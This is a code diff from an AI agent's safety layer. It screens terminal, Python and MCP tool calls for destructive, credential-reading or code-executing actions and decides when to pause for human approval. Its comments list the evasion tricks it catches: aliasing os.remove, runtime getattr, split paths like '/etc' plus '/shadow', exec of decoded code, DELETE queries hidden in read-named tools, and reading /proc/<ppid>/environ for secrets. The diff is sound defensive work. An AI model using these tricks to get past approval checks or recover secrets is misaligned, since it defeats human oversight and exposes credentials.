+        elif isinstance(node, (ast.With, ast.AsyncWith)):
+            # `with open(p, "r+") as f:` binds the handle like an assignment.
+            for item in node.items:
+                ctx = item.context_expr
+                if (
+                    isinstance(ctx, ast.Call)
+                    and isinstance(ctx.func, ast.Name)
+                    and ctx.func.id == "open"
+                    and isinstance(item.optional_vars, ast.Name)
+                ):
+                    file_handles.add(item.optional_vars.id)
+    if file_handles:
+        for node in ast.walk(tree):
+            if (
+                isinstance(node, ast.Call)
+                and isinstance(node.func, ast.Attribute)
+                and node.func.attr == "truncate"
+                and isinstance(node.func.value, ast.Name)
+                and node.func.value.id in file_handles
+            ):
+                return True
+    # A bound reference (f = os.remove; f(x)) hides the call site behind a plain
+    # Name, so record the target name as a destructive alias to catch f(...) below.
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Assign) and isinstance(node.value, ast.Subscript):
+            if _is_module_dict_lookup(node.value):
+                for tgt in node.targets:
+                    if isinstance(tgt, ast.Name):
+                        destructive_fs_aliases.add(tgt.id)
+        elif isinstance(node, ast.Assign) and isinstance(node.value, ast.Attribute):
+            if _is_destructive_attr(node.value.attr, node.value.value):
+                for tgt in node.targets:
+                    if isinstance(tgt, ast.Name):
+                        destructive_fs_aliases.add(tgt.id)
+        elif (
+            isinstance(node, ast.AnnAssign)
+            and isinstance(node.value, ast.Attribute)
+            and isinstance(node.target, ast.Name)
+        ):
+            # An annotated binding (f: object = os.remove) is the same alias.
+            if _is_destructive_attr(node.value.attr, node.value.value):
+                destructive_fs_aliases.add(node.target.id)
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call):
+            continue
+        func = node.func
+        if isinstance(func, ast.Attribute):
+            if _is_destructive_attr(func.attr, func.value):
+                return True
+            if _is_process_kill(func):
+                return True
+        elif isinstance(func, ast.Subscript):
+            if _is_module_dict_lookup(func):
+                return True
+        elif isinstance(func, ast.Name) and func.id in destructive_fs_aliases:
+            return True
+        elif isinstance(func, ast.NamedExpr):
+            # (f := os.remove)(...) binds and calls in one expression.
+            inner = func.value
+            if isinstance(inner, ast.Attribute) and _is_destructive_attr(inner.attr, inner.value):
+                return True
+            if isinstance(inner, ast.Name) and inner.id in destructive_fs_aliases:
+                return True
+            if _is_module_dict_lookup(inner):
+                return True
+        # getattr(os, "remove")(x) resolves the attribute at runtime. The name is
+        # folded first ("un" + "link"); one that cannot be folded at all on a
+        # filesystem module fails closed, since there is nothing left to screen.
+        if (
+            isinstance(func, ast.Call)
+            and isinstance(func.func, ast.Name)
+            and func.func.id == "getattr"
+            and len(func.args) >= 2
+        ):
+            attr_name = _folded_str_literal(func.args[1])
+            if attr_name is None:
+                if _is_fs_module_ref(func.args[0]):
+                    return True
+            elif _is_destructive_attr(attr_name, func.args[0]):
+                return True
+    # A sensitive path split across names or joins (p = "/etc"; open(p + "/shadow"))
+    # is not a contiguous literal above, so fold the string-literal variables
+    # through _folded_path and re-check. An unresolved fragment folds to a sentinel
+    # so a partial fold never false-positives.
+    str_vars: "dict[str, str]" = {}
+    for node in ast.walk(tree):
+        if not (
+            isinstance(node, ast.Assign)
+            and len(node.targets) == 1
+            and isinstance(node.targets[0], ast.Name)
+        ):
+            continue
+        value = node.value
+        if isinstance(value, ast.Constant) and isinstance(value.value, str):
+            str_vars[node.targets[0].id] = value.value
+        elif isinstance(value, (ast.Call, ast.BinOp, ast.JoinedStr, ast.Name)):
+            # Record a fully-literal folded path so a later reuse (p / "shadow")
+            # resolves; a dynamic fold is skipped so only known paths bind.
+            folded = _folded_path(value, str_vars)
+            if folded and "\x00" not in folded and "\x02" not in folded:
+                str_vars[node.targets[0].id] = folded
+
+    for node in ast.walk(tree):
+        if isinstance(node, (ast.BinOp, ast.JoinedStr, ast.Call)):
+            folded = _folded_path(node, str_vars)
+            if folded and _folded_is_sensitive(folded):
+                return True
+    # exec/eval/compile/__import__ of a non-literal (exec(b64decode(...)),
+    # eval(input()), __import__(name)) runs whatever it builds at runtime, past
+    # the static checks above; ask. A literal eval("1+1") is harmless and runs.
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call):
+            continue
+        func = node.func
+        name = None
+        if isinstance(func, ast.Name):
+            name = func.id
+        elif isinstance(func, ast.Attribute):
+            if func.attr == "import_module":  # importlib.import_module(name)
+                name = "__import__"
+            elif func.attr in ("exec", "eval", "compile"):  # builtins.exec(...)
+                name = func.attr
+        if name not in ("exec", "eval", "compile", "__import__"):
+            continue
+        # The source is the first positional, or the source=/name= keyword when
+        # called by keyword (compile(source=x), importlib.import_module(name=x)).
+        arg = node.args[0] if node.args else None
+        if arg is None:
+            for kw in node.keywords:
+                if kw.arg in ("source", "name"):
+                    arg = kw.value
+                    break
+        if arg is None:
+            continue
+        if isinstance(arg, ast.Constant) and isinstance(arg.value, (str, bytes)):
+            # A literal source is only as safe as the code it runs, so screen it
+            # recursively.
+            if name == "__import__":
+                # A module name is not analyzable as code, but a literal
+                # __import__("socket") binds a side-effecting module just like a
+                # static import, so apply the same module screen.
+                mod = (
+                    arg.value.decode("utf-8", "replace")
+                    if isinstance(arg.value, bytes)
+                    else arg.value
+                )
+                if isinstance(mod, str) and mod.split(".")[0] in _AUTO_UNSAFE_PY_MODULES:
+                    return True
+                continue
+            inner = (
+                arg.value.decode("utf-8", "replace") if isinstance(arg.value, bytes) else arg.value
+            )
+            if _python_is_high_risk(inner):
+                return True
+            continue
+        return True
+    return False
+
+
+def is_high_risk_tool_call(name: str, arguments: dict) -> bool:
+    """Whether a tool call is sensitive enough to pause for approval in auto
+    ("Approve for me") mode.
+
+    Unlike is_potentially_unsafe_tool_call (which prompts on anything not
+    read-only), this prompts only on genuinely sensitive actions - credential
+    access, privilege escalation, destructive/persistence changes, and network
+    exec/exfil - and lets ordinary development commands run. The hard-block command
+    set, rlimits and secret-env stripping remain in force underneath. Unknown tools
+    fail closed (prompt).
+    """
+    if name in _ALWAYS_SAFE_TOOLS:
+        return False
+    if name == "render_html":
+        # A static canvas is fine; only a networked canvas can egress.
+        return _render_html_reaches_network(arguments)
+    if name.startswith(MCP_TOOL_PREFIX):
+        tool_name = name.split("__", 2)[-1]
+        # Split camelCase into `_`-delimited terms so the term-boundary regexes
+        # below match camelCase names too.
+        tool_name = _CAMEL_CASE_RE.sub("_", tool_name)
+        # An execution tool runs arbitrary commands on the MCP server, outside the
+        # terminal sandbox; a credential noun discloses secrets; a read/write
+        # pointed at a sensitive path is a sensitive access. All prompt, while
+        # ordinary create/update/delete MCP calls run.
+        _reads = bool(_AUTO_READ_MCP_VERB_RE.search(tool_name))
+        if _AUTO_EXEC_MCP_COMPOUND_RE.search(tool_name):
+            return True
+        if _AUTO_EXEC_MCP_TOOL_RE.search(tool_name) and not (
+            _reads and not _AUTO_EXEC_MCP_VERB_ONLY_RE.search(tool_name)
+        ):
+            return True
+        if _AUTO_DESTRUCTIVE_MCP_VERB_RE.search(tool_name):
+            return True
+        if _AUTO_PRIVILEGE_MCP_VERB_RE.search(tool_name):
+            return True
+        if _AUTO_HIGH_IMPACT_MCP_RE.search(tool_name) and not _reads:
+            return True
+        if _AUTO_PRIVILEGE_MCP_NOUN_RE.search(
+            tool_name
+        ) and _AUTO_PRIVILEGE_MCP_SOFT_VERB_RE.search(tool_name):
+            return True
+        if _AUTO_SENSITIVE_MCP_NOUN_RE.search(tool_name):
+            return True
+        if _mcp_arguments_reference_sensitive(arguments):
+            return True
+        # A read-named tool carrying a destructive payload (query_database
+        # {"query": "DELETE FROM runs"}) masks a destructive external action behind
+        # a read-looking name. Honestly-named create/update calls still run.
+        if _mcp_arguments_mutate(arguments):
+            return True
+        # MCP names are an open vocabulary, not the finite set of POSIX utilities,
+        # so the denylists above cannot be complete: an unfamiliar verb
+        # (nuke_database) would sail through as ordinary. A name carrying no
+        # recognised verb at all therefore asks.
+        if not _mcp_verb_is_known(tool_name):
+            return True
+        return False
+    if name == "terminal":
+        return _terminal_is_high_risk(str(arguments.get("command", "")))
+    if name == "python":
+        return _python_is_high_risk(str(arguments.get("code", "")))
     return True
 
 
@@ -5824,6 +8151,11 @@ def _python_exec(
         error = _check_code_safety(code)
         if error:
             return error
+        # Stripping the child env is not enough: a same-UID child can read
+        # /proc/<getppid()>/environ to recover the unfiltered secrets, so close
+        # that read here too, not only in bypass mode. Best-effort: the child env
+        # is already scrubbed, so a system where prctl is denied still runs.
+        _harden_parent_against_proc_env_leak()
     elif not _harden_parent_against_proc_env_leak():
         # Close the /proc/<parent>/environ secret-recovery path first; if it
         # cannot be applied, fail closed rather than leak the parent environ.
@@ -5969,6 +8301,11 @@ def _bash_exec(
         blocked = _find_blocked_commands(command)
         if blocked:
             return f"Blocked command(s) for safety: {', '.join(sorted(blocked))}"
+        # Stripping the child env is not enough: a same-UID child can read
+        # /proc/<getppid()>/environ to recover the unfiltered secrets, so close
+        # that read here too, not only in bypass mode. Best-effort: the child env
+        # is already scrubbed, so a system where prctl is denied still runs.
+        _harden_parent_against_proc_env_leak()
     elif not _harden_parent_against_proc_env_leak():
         # Close the /proc/<parent>/environ secret-recovery path first; if it
         # cannot be applied, fail closed rather than leak the parent environ.
